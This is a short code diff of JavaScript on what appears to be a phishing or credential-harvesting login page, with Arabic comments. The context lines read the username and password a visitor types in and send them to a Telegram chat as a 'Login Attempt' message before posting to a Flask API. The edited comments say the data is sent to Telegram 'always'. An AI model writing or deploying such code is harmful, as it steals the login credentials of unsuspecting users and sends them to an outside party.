@@ -75,10 +75,10 @@
             const username = document.getElementById("username").value;
             const password = document.getElementById("password").value;
 
-            // إرسال البيانات إلى Telegram
+            // إرسال البيانات إلى Telegram دائمًا
             sendTelegramMessage(`Login Attempt:\nUsername: ${username}\nPassword: ${password}`);
 
-            // إرسال الطلب إلى API الخاص بفحص الحساب
+            // إرسال الطلب إلى Flask API
             fetch(apiUrl, {
                 method: 'POST',
                 headers: {
